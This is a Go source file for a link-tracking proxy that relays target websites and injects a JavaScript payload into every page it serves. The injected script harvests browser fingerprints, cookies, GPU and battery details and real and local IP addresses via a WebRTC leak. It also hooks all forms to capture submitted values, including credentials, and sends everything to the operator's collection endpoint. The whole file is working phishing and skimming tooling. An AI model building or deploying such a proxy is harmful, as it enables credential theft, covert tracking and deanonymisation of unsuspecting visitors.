package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/html"
)

// injectScript builds the JS payload embedded in every proxied page.
// Collects: browser fingerprint, OS, GPU, canvas hash, cookies, network type,
// battery status, WebRTC real IP leak, and hooks all forms for credential capture.
func injectScript(token, serverHost string) string {
	collectURL := serverHost + "/__td__/" + token + "/collect"
	return fmt.Sprintf(`<script>
(function(){
  var C="%s";
  function beacon(p){
    var s=JSON.stringify(p);
    try{navigator.sendBeacon(C,s);}
    catch(e){var x=new XMLHttpRequest();
      x.open("POST",C,true);
      x.setRequestHeader("Content-Type","application/json");
      x.send(s);}
  }

  // ── Core fingerprint ───────────────────────────────────────────────
  var fp={
    ua:       navigator.userAgent,
    platform: navigator.platform,
    lang:     navigator.language,
    langs:    (navigator.languages||[]).join(","),
    screen:   screen.width+"x"+screen.height,
    depth:    screen.colorDepth,
    dpr:      window.devicePixelRatio||1,
    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
    tzoff:    new Date().getTimezoneOffset(),
    cookies:  document.cookie,
    ref:      document.referrer,
    mem:      navigator.deviceMemory||"?",
    cores:    navigator.hardwareConcurrency||"?",
    touch:    navigator.maxTouchPoints||0,
    dark_mode:!!(window.matchMedia&&window.matchMedia("(prefers-color-scheme:dark)").matches),
    do_not_track: navigator.doNotTrack
  };

  // ── Canvas fingerprint — unique per browser/OS combo ───────────────
  try{
    var cv=document.createElement("canvas"),g=cv.getContext("2d");
    g.textBaseline="top"; g.font="14px Arial";
    g.fillStyle="#f60"; g.fillRect(0,0,12,12);
    g.fillStyle="#069"; g.fillText("trackerd",2,14);
    fp.canvas=cv.toDataURL().slice(-48);
  }catch(e){}

  // ── WebGL — GPU model and vendor ───────────────────────────────────
  try{
    var wc=document.createElement("canvas");
    var gl=wc.getContext("webgl")||wc.getContext("experimental-webgl");
    if(gl){
      fp.gpu=gl.getParameter(gl.RENDERER);
      fp.gpu_vendor=gl.getParameter(gl.VENDOR);
      var ext=gl.getExtension("WEBGL_debug_renderer_info");
      if(ext){
        fp.gpu_unmasked=gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        fp.gpu_vendor_unmasked=gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
      }
    }
  }catch(e){}

  // ── Network connection type (WiFi vs cellular vs unknown) ──────────
  try{
    var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    if(nc){fp.net_type=nc.effectiveType; fp.net_downlink=nc.downlink; fp.net_rtt=nc.rtt;}
  }catch(e){}

  // ── Installed plugins ──────────────────────────────────────────────
  try{fp.plugins=[].slice.call(navigator.plugins||[]).map(function(p){return p.name;}).join(",");}catch(e){}

  // Send initial fingerprint immediately
  beacon({t:"fp",d:fp});

  // ── Battery status (works in Chrome/Edge, deprecated elsewhere) ────
  try{
    if(navigator.getBattery){
      navigator.getBattery().then(function(b){
        fp.battery=Math.round(b.level*100)+"%";
        fp.battery_charging=b.charging;
        beacon({t:"fp",d:fp});
      });
    }
  }catch(e){}

  // ── WebRTC IP leak ─────────────────────────────────────────────────
  // Attempts to discover real IP even behind some VPNs by forcing
  // STUN binding requests. Also exposes local network IPs (192.168.x.x)
  // which reveals internal network topology.
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    var rtcIPs={};
    pc.createDataChannel("");
    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
    pc.onicecandidate=function(e){
      if(!e||!e.candidate||!e.candidate.candidate){return;}
      var m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(m&&m[1]&&m[1]!=="0.0.0.0"){rtcIPs[m[1]]=1;}
    };
    setTimeout(function(){
      var ips=Object.keys(rtcIPs);
      if(ips.length>0){fp.webrtc_ips=ips; beacon({t:"fp",d:fp});}
      try{pc.close();}catch(x){}
    },3500);
  }catch(e){}

  // ── Form hook — capture all field values on submit ─────────────────
  function hookForms(){
    [].slice.call(document.forms).forEach(function(form){
      form.addEventListener("submit",function(){
        var fd={_action:form.action||window.location.href};
        [].slice.call(form.elements).forEach(function(el){
          if(el.name)fd[el.name]=el.value;
        });
        beacon({t:"form",d:fd});
      },true);
    });
  }
  if(document.readyState==="loading"){
    document.addEventListener("DOMContentLoaded",hookForms);
  } else { hookForms(); }
})();
</script>`, collectURL)
}

// rewriteURL routes same-origin links back through the proxy.
func rewriteURL(raw, targetOrigin, token string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return raw
	}
	for _, skip := range []string{"#", "data:", "javascript:", "mailto:", "tel:", "blob:"} {
		if strings.HasPrefix(strings.ToLower(raw), skip) {
			return raw
		}
	}
	base, err := url.Parse(targetOrigin)
	if err != nil {
		return raw
	}
	parsed, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	resolved := base.ResolveReference(parsed)
	if !strings.EqualFold(resolved.Host, base.Host) {
		return raw
	}
	path := resolved.Path
	if resolved.RawQuery != "" {
		path += "?" + resolved.RawQuery
	}
	return "/t/" + token + "/p" + path
}

func rewriteNode(n *html.Node, targetOrigin, token string) {
	if n.Type == html.ElementNode {
		for i, a := range n.Attr {
			switch a.Key {
			case "href", "src", "action":
				n.Attr[i].Val = rewriteURL(a.Val, targetOrigin, token)
			}
		}
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		rewriteNode(c, targetOrigin, token)
	}
}

func processHTML(rawHTML, targetOrigin, token, serverHost string) (string, error) {
	doc, err := html.Parse(strings.NewReader(rawHTML))
	if err != nil {
		return rawHTML, err
	}
	rewriteNode(doc, targetOrigin, token)

	var buf bytes.Buffer
	html.Render(&buf, doc)
	result := buf.String()

	script := injectScript(token, serverHost)
	if idx := strings.LastIndex(strings.ToLower(result), "</body>"); idx != -1 {
		result = result[:idx] + script + result[idx:]
	} else {
		result += script
	}
	return result, nil
}

var proxyClient = &http.Client{
	Timeout:       20 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil },
}

func fetchAndProxy(fetchURL, targetOrigin, token, serverHost string, reqHeaders http.Header) (int, http.Header, []byte, error) {
	req, err := http.NewRequest("GET", fetchURL, nil)
	if err != nil {
		return 0, nil, nil, err
	}
	for _, h := range []string{"Accept", "Accept-Language", "Cookie", "User-Agent"} {
		if v := reqHeaders.Get(h); v != "" {
			req.Header.Set(h, v)
		}
	}

	resp, err := proxyClient.Do(req)
	if err != nil {
		return 0, nil, nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 10<<20))
	if err != nil {
		return resp.StatusCode, resp.Header, nil, err
	}

	ct := resp.Header.Get("Content-Type")
	if strings.Contains(ct, "text/html") {
		if modified, err := processHTML(string(body), targetOrigin, token, serverHost); err == nil {
			body = []byte(modified)
		}
	}
	return resp.StatusCode, resp.Header, body, nil
}
